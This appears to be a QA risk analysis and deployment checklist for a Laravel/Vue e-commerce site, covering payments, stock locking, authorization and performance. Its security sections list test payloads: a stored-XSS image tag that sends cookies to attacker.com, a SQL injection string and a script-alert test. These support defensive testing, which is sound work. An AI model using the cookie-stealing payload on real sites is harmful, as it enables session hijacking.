# ⚠️ RISK ASSESSMENT & DEPLOYMENT CHECKLIST

**Document Type**: QA Risk Analysis & Production Readiness  
**Date**: April 15, 2026  
**Risk Level**: HIGH (Financial transactions, stock management, security)  

---

## 🔴 CRITICAL RISK AREAS

### 1. PAYMENT PROCESSING (Financial Impact: CRITICAL)

**Risk**: Duplicate charges, failed payments not handled, stock deducted before payment

**Scenarios to Test**:
- [x] User clicks "Pay" twice quickly → idempotency key prevents duplicate charge
- [x] Stripe times out during payment → user retries → no double charge
- [x] Payment fails → order stays pending, wallet not deducted, user can retry
- [x] Network interrupt during confirmation → webhook updates status correctly
- [x] Webhook arrives before confirm response → both handled gracefully

**Test Cases**:
- TC-PAY-001 through TC-PAY-007 (see QA_TESTING_STRATEGY.md)

**Mitigation Strategies**:
1. **Idempotency Keys**: `hash('sha256', "payment_" . $userId . "_" . now()->format('Y-m-d H:i') . "_" . Str::random(16))`
2. **Request Timeout**: 60 seconds max
3. **Webhook Validation**: Stripe signature verification mandatory
4. **Stock Lock**: Pessimistic lock UNTIL payment succeeds
5. **Logging**: Every payment event logged with trace ID for debugging

**Test Commands**:
```bash
php artisan test tests/Feature/PaymentTest.php
npx cypress run cypress/e2e/payment.cy.js
```

---

### 2. INVENTORY MANAGEMENT (Data Integrity: CRITICAL)

**Risk**: Stock overselling when multiple users buy simultaneously (race condition)

**Bug Scenario**:
```
Product: Laptop (stock = 1)
Time 0ms:  User A: SELECT stock WHERE id=5 → sees 1 available
Time 5ms:  User B: SELECT stock WHERE id=5 → sees 1 available
Time 10ms: User A: UPDATE stock SET stock=0 WHERE id=5 → now 0
Time 15ms: User B: UPDATE stock SET stock=0 WHERE id=5 → now 0 (should be -1!)
Result: OVERSELL - charged both customers, only 1 item exists!
```

**Solution**: Pessimistic Database Locking

```php
// In InventoryService::checkStock()
$product = Product::lockForUpdate()->find($productId); // SELECT ... FOR UPDATE
if ($product->stock < $quantity) {
  throw new InsufficientStockException();
}
```

**How It Works**:
1. `SELECT ... FOR UPDATE` locks the row at database level
2. Other transactions wait until lock released
3. Guarantees stock never goes negative
4. Wrapped in `DB::transaction()` for atomicity

**Test Case**: TC-EDGE-008, TC-CART-005

**Verification**:
```bash
# Unit test for race condition
php artisan test tests/Unit/InventoryServiceTest.php::test_race_condition_lock

# Load test: 50 concurrent checkouts
locust -f tests/load/locustfile.py
```

---

### 3. ORDER STATUS STATE MACHINE (Process Integrity: HIGH)

**Risk**: Invalid state transitions, orders stuck forever, wrong status displayed

**Valid State Flow**:
```
pending → confirmed (payment success)
       ↓
    processing
       ↓
    packed (auto if shipping)
       ↓
    shipped (manual + tracking)
       ↓
    out_for_delivery
       ↓
    delivered

At ANY point: → cancelled
```

**Invalid Transitions** (should fail):
- delivered → pending (customer can't "undeliver")
- shipped → pending (can't unship)
- any → invalid_status

**Bug Scenario**:
```
Admin tries: PUT /api/admin/orders/5/status with status="processing_fast"
Expected: HTTP 400 "Invalid status"
Actual: If validation missing → order stuck in weird state
```

**Test Cases**: TC-ORDER-008, TC-EDGE-005

**Prevention**:
```php
// In OrderStatusHistory migration
$table->enum('status', [
  'pending', 'confirmed', 'processing', 'packed', 
  'shipped', 'out_for_delivery', 'delivered', 'cancelled', 'returned'
]);
```

---

### 4. AUTHENTICATION & AUTHORIZATION (Security: CRITICAL)

**Risk**: Privilege escalation, user access other user's data, token bypass

**Attack Vectors**:
1. **Privilege Escalation**: Regular user tries `POST /api/products` (admin only)
2. **Data Breach**: User A views User B's orders
3. **Token Reuse**: Token copied to different device/IP
4. **Mass Assignment**: POST with `is_admin=true` parameter

**Test Cases**: TC-SEC-004, TC-SEC-005, TC-SEC-006

**Verification**:
```bash
php artisan test tests/Feature/SecurityTest.php
```

**Current Protections**:
- ✅ Route middleware: `['api-token', 'admin']`
- ✅ Model: `$fillable` whitelist prevents mass assignment
- ✅ Policy checks: `$order->user_id !== $user->id` → 403

**TODO**: Add IP/User-Agent binding to tokens for session hijacking prevention

---

### 5. CART & CHECKOUT DATA CONSISTENCY (Integrity: HIGH)

**Risk**: Price changes between cart add and order creation, orphaned records

**Scenario**:
```
Time 0:  User adds Laptop ($999) to cart
Time 10: Admin changes Laptop price to $1,299
Time 20: User completes checkout

Question: Should user be charged $999 (cart price) or $1,299 (current price)?
Answer: $999 (cart price lock) - MUST test this!
```

**Test Case**: TC-EDGE-009

**Current Implementation**:
- Cart items store price at time of add
- OrderItems copy price from CartItem
- Price NOT fetched from Product at checkout time

**Verification**:
```bash
php artisan test tests/Feature/CheckoutTest.php::test_price_locked_on_cart_add
```

---

### 6. DATABASE FOREIGN KEY CASCADES (Data Integrity: HIGH)

**Risk**: Orphaned records, data inconsistency after delete

**Scenarios**:
```
DELETE FROM users WHERE id=5
→ Should cascade to: orders, reviews, cart

DELETE FROM products WHERE id=10
→ Should handle: CartItems, OrderItems, Reviews

DELETE FROM orders WHERE id=1
→ Should preserve: Payment (audit trail), but mark order deleted
```

**Test Case**: TC-EDGE-010

**Current Schema** (verify in migrations):
```sql
FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
FOREIGN KEY (product_id) REFERENCES products(id) ON DELETE CASCADE
FOREIGN KEY (order_id) REFERENCES orders(id) ON DELETE CASCADE
```

---

## 🟠 HIGH-RISK AREAS (Non-Critical but Important)

### 7. XSS - STORED (Security: HIGH)

**Injection Point**: Review comments

**Attack**: `<img src=x onerror="fetch('http://attacker.com/steal?cookie=' + document.cookie)">`

**Current Protection**:
- ✅ Stored as TEXT (not HTML)
- ✅ Vue auto-escapes: `{{ comment }}`
- ✅ HTML entities on output

**Test Case**: TC-SEC-003

**Verification**: Check DB and frontend render
```bash
# Should render as safe HTML entities, not execute
SELECT comment FROM reviews WHERE id=1;
# Output: &lt;img src=x onerror=...&gt;
```

---

### 8. SQL INJECTION (Security: HIGH)

**Injection Points**: Search, filters, user input

**Attack Example**: `search=" OR 1=1 --"`

**Current Protection**:
- ✅ Eloquent ORM parameterized queries
- ✅ Form request validation with regex
- ✅ No raw SQL in controllers

**Test Case**: TC-SEC-001, TC-SEC-002

---

### 9. RATE LIMITING (Security: HIGH)

**Risk**: Brute force password attacks, API abuse

**Current**: 5 requests/minute on auth endpoints

**Test Case**: TC-AUTH-007

**Verification**:
```bash
# Send 6 requests to /api/auth/login in 60 seconds
for i in {1..6}; do
  curl -X POST localhost:8000/api/auth/login \
    -d 'email=test@test.com&password=wrong'
  echo "Request $i"
done
# 6th should return 429
```

---

### 10. PERFORMANCE - N+1 Query Problem (Performance: HIGH)

**Bug Scenario**:
```
GET /api/products (fetch 12 products with categories)

BAD (N+1):
  Query 1: SELECT * FROM products LIMIT 12
  Query 13-24: SELECT * FROM categories WHERE id=... (12 separate queries!)
  TOTAL: 13 queries

GOOD (Eager Loading):
  Query 1: SELECT * FROM products LIMIT 12
  Query 2: SELECT * FROM categories WHERE id IN (...)
  TOTAL: 2 queries
```

**Test Case**: TC-PERF-009

**Verification** (Laravel Debugbar):
- [ ] Enable `APP_DEBUG=true`
- [ ] Use Laravel Debugbar to verify query count
- [ ] Should see no N+1 patterns

---

## ✅ DEPLOYMENT READINESS CHECKLIST

### Category 1: Code Quality

- [ ] All 80+ test cases pass
  ```bash
  php artisan test
  npx cypress run
  ```

- [ ] Code coverage >= 80%
  ```bash
  php artisan test --coverage
  ```

- [ ] No linting errors
  ```bash
  npm run lint
  php vendor/bin/pint --test
  ```

- [ ] No console errors in browser (F12 → Console tab)

- [ ] Database migrations created
  ```bash
  php artisan migrate:status
  # Should show PENDING: 0
  ```

---

### Category 2: Security

- [ ] **Password**: Hashed with bcrypt (verify in DB)
  ```bash
  SELECT password FROM users LIMIT 1;
  # Should start with $2y$ (bcrypt)
  ```

- [ ] **SQL Injection**: All user input parameterized
  - Verified via SecurityTest.php
  
- [ ] **XSS**: Output escaped
  - Test review with `<script>alert('xss')</script>`
  - Should render as text, not execute

- [ ] **CSRF**: Tokens present on forms (Laravel default)

- [ ] **Rate Limiting**: Active on auth/payment endpoints
  - Verified via TC-AUTH-007

- [ ] **API Tokens**: Never logged in plaintext
  - Check logs: no api_token values

- [ ] **Stripe Webhook**: Signature verification enabled
  - STRIPE_WEBHOOK_SECRET in .env

- [ ] **PII Logging**: No passwords/emails/tokens in logs
  ```bash
  grep -r "password\|credit_card\|api_token" storage/logs/
  # Should return 0 results
  ```

---

### Category 3: Payment Integration

- [ ] **Stripe Keys**: Configured in .env
  ```bash
  grep STRIPE .env
  # Should show SECRET_KEY and PUBLIC_KEY
  ```

- [ ] **Test Mode**: Using sandbox keys, NOT live keys
  ```bash
  # SECRET_KEY should start with sk_test_ (not sk_live_)
  echo $STRIPE_SECRET_KEY
  ```

- [ ] **Payment Intent**: Created successfully with test card
  ```bash
  curl -X POST localhost:8000/api/payments/intent \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"amount": 9999, "currency": "usd"}'
  # Should return 201 with client_secret
  ```

- [ ] **Webhook Setup**: Registered in Stripe Dashboard
  - Endpoint: `https://yourdomain.com/api/webhooks/stripe`
  - Events: `payment_intent.succeeded`, `payment_intent.payment_failed`
  - Secret copied to .env

- [ ] **Test Payment Flow**: End-to-end successful charge
  - Add to cart → Checkout → Confirm payment → Order confirmed

- [ ] **Refund Tested**: Issue refund, verify stock restored

---

### Category 4: Data Integrity

- [ ] **Inventory Lock**: Stock never negative
  - Verified via TC-CART-005

- [ ] **Price Lock**: Order charged at cart price, not current price
  - Verified via TC-EDGE-009

- [ ] **Duplicate Prevention**: Idempotency keys work
  - Verified via TC-PAY-005

- [ ] **Foreign Key Cascades**: Delete user → orders deleted
  ```bash
  php artisan tinker
  >>> $user = User::find(1); 
  >>> $user->delete();
  >>> User::find(1); // Null
  >>> Order::where('user_id', 1)->count(); // 0
  ```

- [ ] **Database Constraints**: Can't insert invalid data
  ```bash
  # Try to insert order with invalid status
  INSERT INTO orders (status) VALUES ('invalid_status');
  # Should fail (enum constraint)
  ```

---

### Category 5: Performance

- [ ] **Product List**: < 500ms (GET /api/products)
- [ ] **Product Search**: < 800ms (GET /api/products?search=...)
- [ ] **Checkout**: < 1.5s (POST /api/orders/checkout)
- [ ] **Payment Intent**: < 3s (includes Stripe call)

**Measurement**:
```bash
# Use curl to measure
time curl http://localhost:8000/api/products

# Or use Apache Benchmark
ab -n 10 -c 1 http://localhost:8000/api/products
```

---

### Category 6: Frontend

- [ ] **Mobile Responsive**: Tested on 320px (iPhone SE)
  - Product grid: 1-2 columns
  - Buttons: >= 48px
  - No horizontal scroll

- [ ] **Tablet**: Tested on 768px (iPad)
  - Product grid: 3-4 columns

- [ ] **Desktop**: Tested on 1024px
  - Product grid: 4-6 columns

- [ ] **Cross-Browser**:
  - [ ] Chrome (latest)
  - [ ] Firefox (latest)
  - [ ] Safari (latest)

- [ ] **Touch**: All buttons tappable on mobile
- [ ] **Loading States**: Spinners visible during async operations
- [ ] **Error Messages**: User-friendly, not technical ("Invalid credentials" not "Error 422")

---

### Category 7: Admin & Monitoring

- [ ] **Error Tracking**: Sentry configured (optional but recommended)
- [ ] **Performance Monitoring**: NewRelic or similar (optional)
- [ ] **Database Backups**: Automated daily backups to S3
- [ ] **Log Rotation**: Logs don't fill disk
  ```bash
  # Laravel config/logging.php configured
  grep -i max_size config/logging.php
  ```

- [ ] **Admin Dashboard**: Stats accurate
  - Total orders count correct
  - Revenue sum correct
  - Pending orders list correct

---

### Category 8: Documentation

- [ ] **README**: Updated with setup instructions
- [ ] **API Docs**: Endpoint documentation complete
- [ ] **Environment Template**: .env.example with all vars
- [ ] **Deployment Guide**: Production setup documented
- [ ] **QA Test Cases**: This document

---

### Category 9: Emergency Procedures

- [ ] **Rollback Plan**: Previous version deployable
- [ ] **Database Backup**: Latest backup available
- [ ] **Support Contact**: Who to call if issues?
- [ ] **Incident Response**: What to do if payment fails?

---

## 🚨 CRITICAL FAILURE SCENARIOS

**If ANY of these fail, DO NOT DEPLOY**:

| Scenario | Impact | Test | Pass? |
|----------|--------|------|-------|
| Duplicate charge occurs | **Financial Loss** | TC-PAY-005 | [ ] |
| Stock goes negative | **Overbooking** | TC-CART-005 | [ ] |
| User can access other's orders | **Data Breach** | TC-SEC-005 | [ ] |
| SQL injection succeeds | **Data Loss** | TC-SEC-001 | [ ] |
| Password stored plaintext | **Account Hijacking** | DB check | [ ] |
| Stripe webhook fails silent | **Orders stuck forever** | Webhook test | [ ] |
| Admin can't update product | **Cannot sell** | TC-ADMIN-002 | [ ] |
| Cart clears unexpectedly | **User frustration** | TC-CART-004 | [ ] |

---

## 📋 SIGN-OFF FORM

```
QA TESTING SIGN-OFF

Project: Ceylon Craft E-Commerce
Version: 1.0 Production
Date: ___/___/____
Tester: ____________________

FUNCTIONAL TESTING
- All 80 test cases reviewed: [ ] Pass [ ] Fail
- Edge cases covered: [ ] Yes [ ] No
- Known issues logged: [ ] Yes [ ] No

SECURITY TESTING
- SQL injection tests: [ ] Pass [ ] Fail
- XSS tests: [ ] Pass [ ] Fail
- Authorization tests: [ ] Pass [ ] Fail
- Rate limiting: [ ] Pass [ ] Fail

PAYMENT TESTING
- Stripe integration works: [ ] Yes [ ] No
- Duplicate prevention works: [ ] Yes [ ] No
- Webhook integration works: [ ] Yes [ ] No
- Refund flow works: [ ] Yes [ ] No

PERFORMANCE TESTING
- Product list: < 500ms [ ] Yes [ ] No
- Checkout: < 1.5s [ ] Yes [ ] No
- Concurrent users (50): [ ] Pass [ ] Fail

RESPONSIVE TESTING
- Mobile (320px): [ ] Pass [ ] Fail
- Tablet (768px): [ ] Pass [ ] Fail
- Desktop (1024px): [ ] Pass [ ] Fail

OVERALL QA STATUS
[ ] APPROVED FOR PRODUCTION
[ ] BLOCKED - ISSUES FOUND

Issues Found (if blocked):
1. _________________________________
2. _________________________________
3. _________________________________

Tester Signature: __________________ Date: ________
Manager Approval: _________________ Date: ________
```

---

**READY FOR PRODUCTION DEPLOYMENT**: ✅ (When all checkboxes marked pass)

**Risk Level**: MEDIUM (All critical tests pass, some edge cases may emerge in production)

**Post-Deployment Monitoring**: 
- First 24 hours: Monitor payment success rate (should be > 95%)
- First week: Monitor for duplicate charges (should be 0)
- First month: Monitor error logs for unknown issues
